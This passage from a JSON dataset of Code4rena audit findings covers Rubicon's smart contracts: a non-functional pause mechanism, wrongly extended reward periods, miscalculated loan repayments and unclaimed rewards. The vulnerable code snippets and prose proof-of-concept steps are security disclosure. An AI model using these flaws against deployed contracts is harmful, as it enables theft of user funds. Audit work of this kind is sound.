getRecipient(id) && getOwner(id) == address(0)),\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n```\n\nSince calling the `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot close or stop the market, the `RubiconMarket` contract's owner is unable to pause any functionlities of the market and prevented any unintended outflow and loss of user funds when an emergency occurs, such as if the protocol gets attacked and hacked.\n\n## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The protocol is hacked so the `RubiconMarket` contract's owner calls the `ExpiringMarket.stop` function as an attempt to pause the functionalities of the market.\n2. After the `ExpiringMarket.stop` function is called, none of the market's functionalities are paused because `stopped` is not used at all in the protocol for pausing any of the market's functionalities and the `ExpiringMarket.isClosed` function always returns `false`.\n3. As a result, the attacker can transfer user funds out from the protocol, and such user funds are lost.\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `ExpiringMarket.stop` function can be updated to set `stopped` to true or false by the `RubiconMarket` contract's owner. The `ExpiringMarket.isClosed` function can then be updated to return `stopped`. This enables the `RubiconMarket` contract's owner to pause and unpause the market's functionalities when needed.",
      "description": null,
      "impact": "## Impact\nAlthough the following `ExpiringMarket.stop` function can be called by the `RubiconMarket` contract's owner, calling it does not stop the market because `stopped` is not used at all in the protocol for pausing any of the market's functionalities.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\n```solidity\n    function stop() external auth {\n        stopped = true;\n    }\n```\n\nMoreover, the following `ExpiringMarket.isClosed` function always returns `false`. This means that the market cannot be closed. Since this `ExpiringMarket.isClosed` function is called in the `ExpiringMarket.can_offer` and `ExpiringMarket.can_buy` modifiers below, these modifiers' `require(!isClosed())` will always pass, and new offers and buys are always allowed. Similarly, the below `RubiconMarket.can_cancel` modifier's `require` statement's `isClosed()` check is always false so the situation, where the user wants to cancel an offer when the market is closed, does not exist at all.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\n```solidity\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\n```solidity\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n```solidity\n    // // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() ||\n                msg.sender == getOwner(id) ||\n                id == dustId ||\n                (msg.sender == getRecipient(id) && getOwner(id) == address(0)),\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n```\n\nSince calling the `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot close or stop the market, the `RubiconMarket` contract's owner is unable to pause any functionlities of the market and prevented any unintended outflow and loss of user funds when an emergency occurs, such as if the protocol gets attacked and hacked.\n",
      "mitigation": "## Recommended Mitigation Steps\nThe `ExpiringMarket.stop` function can be updated to set `stopped` to true or false by the `RubiconMarket` contract's owner. The `ExpiringMarket.isClosed` function can then be updated to return `stopped`. This enables the `RubiconMarket` contract's owner to pause and unpause the market's functionalities when needed.\n",
      "poc": "## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The protocol is hacked so the `RubiconMarket` contract's owner calls the `ExpiringMarket.stop` function as an attempt to pause the functionalities of the market.\n2. After the `ExpiringMarket.stop` function is called, none of the market's functionalities are paused because `stopped` is not used at all in the protocol for pausing any of the market's functionalities and the `ExpiringMarket.isClosed` function always returns `false`.\n3. As a result, the attacker can transfer user funds out from the protocol, and such user funds are lost.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nAlthough the following `ExpiringMarket.stop` function can be called by the `RubiconMarket` contract's owner, calling it does not stop the market because `stopped` is not used at all in the protocol for pausing any of the market's functionalities.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\n```solidity\n    function stop() external auth {\n        stopped = true;\n    }\n```\n\nMoreover, the following `ExpiringMarket.isClosed` function always returns `false`. This means that the market cannot be closed. Since this `ExpiringMarket.isClosed` function is called in the `ExpiringMarket.can_offer` and `ExpiringMarket.can_buy` modifiers below, these modifiers' `require(!isClosed())` will always pass, and new offers and buys are always allowed. Similarly, the below `RubiconMarket.can_cancel` modifier's `require` statement's `isClosed()` check is always false so the situation, where the user wants to cancel an offer when the market is closed, does not exist at all.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\n```solidity\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\n```solidity\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n```solidity\n    // // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() ||\n                msg.sender == getOwner(id) ||\n                id == dustId ||\n                (msg.sender == getRecipient(id) && getOwner(id) == address(0)),\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n```\n\nSince calling the `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot close or stop the market, the `RubiconMarket` contract's owner is unable to pause any functionlities of the market and prevented any unintended outflow and loss of user funds when an emergency occurs, such as if the protocol gets attacked and hacked.\n",
        "recommendation": "## Recommended Mitigation Steps\nThe `ExpiringMarket.stop` function can be updated to set `stopped` to true or false by the `RubiconMarket` contract's owner. The `ExpiringMarket.isClosed` function can then be updated to return `stopped`. This enables the `RubiconMarket` contract's owner to pause and unpause the market's functionalities when needed.\n",
        "poc": "## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The protocol is hacked so the `RubiconMarket` contract's owner calls the `ExpiringMarket.stop` function as an attempt to pause the functionalities of the market.\n2. After the `ExpiringMarket.stop` function is called, none of the market's functionalities are paused because `stopped` is not used at all in the protocol for pausing any of the market's functionalities and the `ExpiringMarket.isClosed` function always returns `false`.\n3. As a result, the attacker can transfer user funds out from the protocol, and such user funds are lost.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n\n\n# Vulnerability details\n\n## Impact\nAlthough the following `ExpiringMarket.stop` function can be called by the `RubiconMarket` contract's owner, calling it does not stop the market because `stopped` is not used at all in the protocol for pausing any of the market's functionalities.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\n```solidity\n    function stop() external auth {\n        stopped = true;\n    }\n```\n\nMoreover, the following `ExpiringMarket.isClosed` function always returns `false`. This means that the market cannot be closed. Since this `ExpiringMarket.isClosed` function is called in the `ExpiringMarket.can_offer` and `ExpiringMarket.can_buy` modifiers below, these modifiers' `require(!isClosed())` will always pass, and new offers and buys are always allowed. Similarly, the below `RubiconMarket.can_cancel` modifier's `require` statement's `isClosed()` check is always false so the situation, where the user wants to cancel an offer when the market is closed, does not exist at all.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\n```solidity\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\n```solidity\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n```solidity\n    // // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() ||\n                msg.sender == getOwner(id) ||\n                id == dustId ||\n                (msg.sender == getRecipient(id) && getOwner(id) == address(0)),\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n```\n\nSince calling the `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot close or stop the market, the `RubiconMarket` contract's owner is unable to pause any functionlities of the market and prevented any unintended outflow and loss of user funds when an emergency occurs, such as if the protocol gets attacked and hacked.\n\n## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The protocol is hacked so the `RubiconMarket` contract's owner calls the `ExpiringMarket.stop` function as an attempt to pause the functionalities of the market.\n2. After the `ExpiringMarket.stop` function is called, none of the market's functionalities are paused because `stopped` is not used at all in the protocol for pausing any of the market's functionalities and the `ExpiringMarket.isClosed` function always returns `false`.\n3. As a result, the attacker can transfer user funds out from the protocol, and such user funds are lost.\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `ExpiringMarket.stop` function can be updated to set `stopped` to true or false by the `RubiconMarket` contract's owner. The `ExpiringMarket.isClosed` function can then be updated to return `stopped`. This enables the `RubiconMarket` contract's owner to pause and unpause the market's functionalities when needed.\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 907,
      "page_start": null,
      "heading": "907. Incorrect reward duration extension in notifyRewardAmount function",
      "heading_cleaned": "Incorrect reward duration extension in notifyRewardAmount function",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L223-L226\n\n\n# Vulnerability details\n\n## Impact\n\nThis issue can lead to extending the reward duration beyond the intended time period, causing rewards to be distributed over a longer duration than initially planned. This could result in users receiving smaller rewards over time, which may not align with the project's goals or user expectations.\n\n\n## Proof of Concept\n\nThe `notifyRewardAmount` function updates the reward rate and the period finish time for a given rewards token.\n\nIt first checks if the current block timestamp is greater than or equal to the period finish time for the given rewards token. If the reward period has passed, the reward rate is set by dividing the `reward` amount by the `rewardsDuration` for the rewards token. If the reward period has not yet passed, the remaining time and the leftover reward amount are calculated based on the current reward rate. The new reward rate is then set by adding the leftover amount to the new reward amount and dividing by the `rewardsDuration`.\n\nFinally, the function then updates the `lastUpdateTime` for the rewards token to the current block timestamp and increments the `periodFinish` time by adding the `rewardsDuration`.\n\nThis means if there's an ongoing reward duration and its halfway done ,adding new rewards will automatically increase the reward duration by the initial time period.\n\n```solidity\n        // @audit always increments\n        periodFinish[address(rewardsToken)] = block.timestamp.add(\n            rewardsDuration[address(rewardsToken)]\n        );\n```\n\nAfter discussing with the sponsor, they acknowledged that this behavior was not expected.\n\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nModify the `notifyRewardAmount` function to only extend the reward duration when necessary\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L223-L226\n\n\n# Vulnerability details\n\n## Impact\n\nThis issue can lead to extending the reward duration beyond the intended time period, causing rewards to be distributed over a longer duration than initially planned. This could result in users receiving smaller rewards over time, which may not align with the project's goals or user expectations.\n\n\n## Proof of Concept\n\nThe `notifyRewardAmount` function updates the reward rate and the period finish time for a given rewards token.\n\nIt first checks if the current block timestamp is greater than or equal to the period finish time for the given rewards token. If the reward period has passed, the reward rate is set by dividing the `reward` amount by the `rewardsDuration` for the rewards token. If the reward period has not yet passed, the remaining time and the leftover reward amount are calculated based on the current reward rate. The new reward rate is then set by adding the leftover amount to the new reward amount and dividing by the `rewardsDuration`.\n\nFinally, the function then updates the `lastUpdateTime` for the rewards token to the current block timestamp and increments the `periodFinish` time by adding the `rewardsDuration`.\n\nThis means if there's an ongoing reward duration and its halfway done ,adding new rewards will automatically increase the reward duration by the initial time period.\n\n```solidity        \n        // @audit always increments \n        periodFinish[address(rewardsToken)] = block.timestamp.add(\n            rewardsDuration[address(rewardsToken)]\n        );\n```\n\nAfter discussing with the sponsor, they acknowledged that this behavior was not expected.\n\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nModify the `notifyRewardAmount` function to only extend the reward duration when necessary\n",
      "description": null,
      "impact": "## Impact\n\nThis issue can lead to extending the reward duration beyond the intended time period, causing rewards to be distributed over a longer duration than initially planned. This could result in users receiving smaller rewards over time, which may not align with the project's goals or user expectations.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nModify the `notifyRewardAmount` function to only extend the reward duration when necessary\n",
      "poc": "## Proof of Concept\n\nThe `notifyRewardAmount` function updates the reward rate and the period finish time for a given rewards token.\n\nIt first checks if the current block timestamp is greater than or equal to the period finish time for the given rewards token. If the reward period has passed, the reward rate is set by dividing the `reward` amount by the `rewardsDuration` for the rewards token. If the reward period has not yet passed, the remaining time and the leftover reward amount are calculated based on the current reward rate. The new reward rate is then set by adding the leftover amount to the new reward amount and dividing by the `rewardsDuration`.\n\nFinally, the function then updates the `lastUpdateTime` for the rewards token to the current block timestamp and increments the `periodFinish` time by adding the `rewardsDuration`.\n\nThis means if there's an ongoing reward duration and its halfway done ,adding new rewards will automatically increase the reward duration by the initial time period.\n\n```solidity\n        // @audit always increments\n        periodFinish[address(rewardsToken)] = block.timestamp.add(\n            rewardsDuration[address(rewardsToken)]\n        );\n```\n\nAfter discussing with the sponsor, they acknowledged that this behavior was not expected.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L223-L226\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nThis issue can lead to extending the reward duration beyond the intended time period, causing rewards to be distributed over a longer duration than initially planned. This could result in users receiving smaller rewards over time, which may not align with the project's goals or user expectations.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nModify the `notifyRewardAmount` function to only extend the reward duration when necessary\n",
        "poc": "## Proof of Concept\n\nThe `notifyRewardAmount` function updates the reward rate and the period finish time for a given rewards token.\n\nIt first checks if the current block timestamp is greater than or equal to the period finish time for the given rewards token. If the reward period has passed, the reward rate is set by dividing the `reward` amount by the `rewardsDuration` for the rewards token. If the reward period has not yet passed, the remaining time and the leftover reward amount are calculated based on the current reward rate. The new reward rate is then set by adding the leftover amount to the new reward amount and dividing by the `rewardsDuration`.\n\nFinally, the function then updates the `lastUpdateTime` for the rewards token to the current block timestamp and increments the `periodFinish` time by adding the `rewardsDuration`.\n\nThis means if there's an ongoing reward duration and its halfway done ,adding new rewards will automatically increase the reward duration by the initial time period.\n\n```solidity\n        // @audit always increments\n        periodFinish[address(rewardsToken)] = block.timestamp.add(\n            rewardsDuration[address(rewardsToken)]\n        );\n```\n\nAfter discussing with the sponsor, they acknowledged that this behavior was not expected.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L223-L226\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L223-L226\n\n\n# Vulnerability details\n\n## Impact\n\nThis issue can lead to extending the reward duration beyond the intended time period, causing rewards to be distributed over a longer duration than initially planned. This could result in users receiving smaller rewards over time, which may not align with the project's goals or user expectations.\n\n\n## Proof of Concept\n\nThe `notifyRewardAmount` function updates the reward rate and the period finish time for a given rewards token.\n\nIt first checks if the current block timestamp is greater than or equal to the period finish time for the given rewards token. If the reward period has passed, the reward rate is set by dividing the `reward` amount by the `rewardsDuration` for the rewards token. If the reward period has not yet passed, the remaining time and the leftover reward amount are calculated based on the current reward rate. The new reward rate is then set by adding the leftover amount to the new reward amount and dividing by the `rewardsDuration`.\n\nFinally, the function then updates the `lastUpdateTime` for the rewards token to the current block timestamp and increments the `periodFinish` time by adding the `rewardsDuration`.\n\nThis means if there's an ongoing reward duration and its halfway done ,adding new rewards will automatically increase the reward duration by the initial time period.\n\n```solidity\n        // @audit always increments\n        periodFinish[address(rewardsToken)] = block.timestamp.add(\n            rewardsDuration[address(rewardsToken)]\n        );\n```\n\nAfter discussing with the sponsor, they acknowledged that this behavior was not expected.\n\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nModify the `notifyRewardAmount` function to only extend the reward duration when necessary\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1003,
      "page_start": null,
      "heading": "1003. Wrong calculation of repayment amount in Position contract",
      "heading_cleaned": "Wrong calculation of repayment amount in Position contract",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L282\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L82\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L329-L331\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L87\n\n\n# Vulnerability details\n\n## Impact\n\nWhen a user calls `closePosition(..)` -> `_repay(..)` on the `Position` contract, the function `borrowBalanceOfPos(..)` is used to calculate the amount that the user needs to repay. This repayment amount is equivalent to the amount the user borrowed (`_borrowedAmount`) plus their interest (`_interest`). To calculate this interest portion, the function multiplies the current borrowRate by the difference in number of blocks between when the user created the position and the current block timestamp. The issue arises because the borrowRate over the entire duration of the borrow is defined as: `rate = CTokenInterface(bathToken).borrowRatePerBlock();`. However `borrowRatePerBlock()` is a function of total borrows and total supply for the cToken, thus is not required to be the same over the entire duration of when the user takes out their position. This means the calculated repayment amount can potentially overshoot or undershoot the actual amount.\n\n## Proof of Concept\n\nSteps:\n    1. Bob uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this results in an increased borrow interest rate\n    2. Later, Alice also uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this again results in an increased borrow interest rate\n    3. Bob calls `closePosition(..)`, where the call to `_repay(..)` references the current `borrowRatePerBlock()` which prices Bob's interest at the rate which includes Bob and Alice's borrows\n\nThis then results in excess `asset` being swapped to `quote`, than what is needed for repayment\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nPotentially keep track of changes in the supply/borrow state, however this might not be worth the tradeoff in increased gas\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L282\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L82\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L329-L331\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L87\n\n\n# Vulnerability details\n\n## Impact\n\nWhen a user calls `closePosition(..)` -> `_repay(..)` on the `Position` contract, the function `borrowBalanceOfPos(..)` is used to calculate the amount that the user needs to repay. This repayment amount is equivalent to the amount the user borrowed (`_borrowedAmount`) plus their interest (`_interest`). To calculate this interest portion, the function multiplies the current borrowRate by the difference in number of blocks between when the user created the position and the current block timestamp. The issue arises because the borrowRate over the entire duration of the borrow is defined as: `rate = CTokenInterface(bathToken).borrowRatePerBlock();`. However `borrowRatePerBlock()` is a function of total borrows and total supply for the cToken, thus is not required to be the same over the entire duration of when the user takes out their position. This means the calculated repayment amount can potentially overshoot or undershoot the actual amount.\n\n## Proof of Concept\n\nSteps:\n    1. Bob uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this results in an increased borrow interest rate\n    2. Later, Alice also uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this again results in an increased borrow interest rate\n    3. Bob calls `closePosition(..)`, where the call to `_repay(..)` references the current `borrowRatePerBlock()` which prices Bob's interest at the rate which includes Bob and Alice's borrows\n\nThis then results in excess `asset` being swapped to `quote`, than what is needed for repayment\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nPotentially keep track of changes in the supply/borrow state, however this might not be worth the tradeoff in increased gas",
      "description": null,
      "impact": "## Impact\n\nWhen a user calls `closePosition(..)` -> `_repay(..)` on the `Position` contract, the function `borrowBalanceOfPos(..)` is used to calculate the amount that the user needs to repay. This repayment amount is equivalent to the amount the user borrowed (`_borrowedAmount`) plus their interest (`_interest`). To calculate this interest portion, the function multiplies the current borrowRate by the difference in number of blocks between when the user created the position and the current block timestamp. The issue arises because the borrowRate over the entire duration of the borrow is defined as: `rate = CTokenInterface(bathToken).borrowRatePerBlock();`. However `borrowRatePerBlock()` is a function of total borrows and total supply for the cToken, thus is not required to be the same over the entire duration of when the user takes out their position. This means the calculated repayment amount can potentially overshoot or undershoot the actual amount.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nPotentially keep track of changes in the supply/borrow state, however this might not be worth the tradeoff in increased gas\n",
      "poc": "## Proof of Concept\n\nSteps:\n    1. Bob uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this results in an increased borrow interest rate\n    2. Later, Alice also uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this again results in an increased borrow interest rate\n    3. Bob calls `closePosition(..)`, where the call to `_repay(..)` references the current `borrowRatePerBlock()` which prices Bob's interest at the rate which includes Bob and Alice's borrows\n\nThis then results in excess `asset` being swapped to `quote`, than what is needed for repayment\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L282\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L82\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L329-L331\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L87\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nWhen a user calls `closePosition(..)` -> `_repay(..)` on the `Position` contract, the function `borrowBalanceOfPos(..)` is used to calculate the amount that the user needs to repay. This repayment amount is equivalent to the amount the user borrowed (`_borrowedAmount`) plus their interest (`_interest`). To calculate this interest portion, the function multiplies the current borrowRate by the difference in number of blocks between when the user created the position and the current block timestamp. The issue arises because the borrowRate over the entire duration of the borrow is defined as: `rate = CTokenInterface(bathToken).borrowRatePerBlock();`. However `borrowRatePerBlock()` is a function of total borrows and total supply for the cToken, thus is not required to be the same over the entire duration of when the user takes out their position. This means the calculated repayment amount can potentially overshoot or undershoot the actual amount.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nPotentially keep track of changes in the supply/borrow state, however this might not be worth the tradeoff in increased gas\n",
        "poc": "## Proof of Concept\n\nSteps:\n    1. Bob uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this results in an increased borrow interest rate\n    2. Later, Alice also uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this again results in an increased borrow interest rate\n    3. Bob calls `closePosition(..)`, where the call to `_repay(..)` references the current `borrowRatePerBlock()` which prices Bob's interest at the rate which includes Bob and Alice's borrows\n\nThis then results in excess `asset` being swapped to `quote`, than what is needed for repayment\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L282\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L82\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L329-L331\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L87\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L282\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L82\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L329-L331\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L87\n\n\n# Vulnerability details\n\n## Impact\n\nWhen a user calls `closePosition(..)` -> `_repay(..)` on the `Position` contract, the function `borrowBalanceOfPos(..)` is used to calculate the amount that the user needs to repay. This repayment amount is equivalent to the amount the user borrowed (`_borrowedAmount`) plus their interest (`_interest`). To calculate this interest portion, the function multiplies the current borrowRate by the difference in number of blocks between when the user created the position and the current block timestamp. The issue arises because the borrowRate over the entire duration of the borrow is defined as: `rate = CTokenInterface(bathToken).borrowRatePerBlock();`. However `borrowRatePerBlock()` is a function of total borrows and total supply for the cToken, thus is not required to be the same over the entire duration of when the user takes out their position. This means the calculated repayment amount can potentially overshoot or undershoot the actual amount.\n\n## Proof of Concept\n\nSteps:\n    1. Bob uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this results in an increased borrow interest rate\n    2. Later, Alice also uses the Position contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function, this again results in an increased borrow interest rate\n    3. Bob calls `closePosition(..)`, where the call to `_repay(..)` references the current `borrowRatePerBlock()` which prices Bob's interest at the rate which includes Bob and Alice's borrows\n\nThis then results in excess `asset` being swapped to `quote`, than what is needed for repayment\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nPotentially keep track of changes in the supply/borrow state, however this might not be worth the tradeoff in increased gas\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1021,
      "page_start": null,
      "heading": "1021. Position doesn't distribute rewards to users",
      "heading_cleaned": "Position doesn't distribute rewards to users",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L350-L379\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L271-L277\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L113-L128\n\n\n# Vulnerability details\n\n## Impact\nIn Compound V2 both borrowers and suppliers are eligible to earn rewards. The Position contract allows users to create long/short positions for each market. For that, it both supplies and borrows tokens from a compound market. So while the user is the one who provided the initial tokens to open up a position, it's the Position contract that holds the cTokens that earn the rewards. These rewards are not distributed to position owners. Instead, they are locked up as the Position contract never claims them. That also means that anybody else who uses the market has their rewards diluted.\n\n## Proof of Concept\nWhenever cTokens are minted, transferred, or burned the Comptroller is notified to distribute rewards. When cTokens are minted, `mintFresh()` triggers [`Comptroller.mintAllowed()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L400) which distributes rewards through [`distributeSupplierComp()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/Comptroller.sol#L322):\n```sol\n    // CToken.sol\n    function mintFresh(address minter, uint mintAmount) internal {\n        /* Fail if mint not allowed */\n        uint allowed = 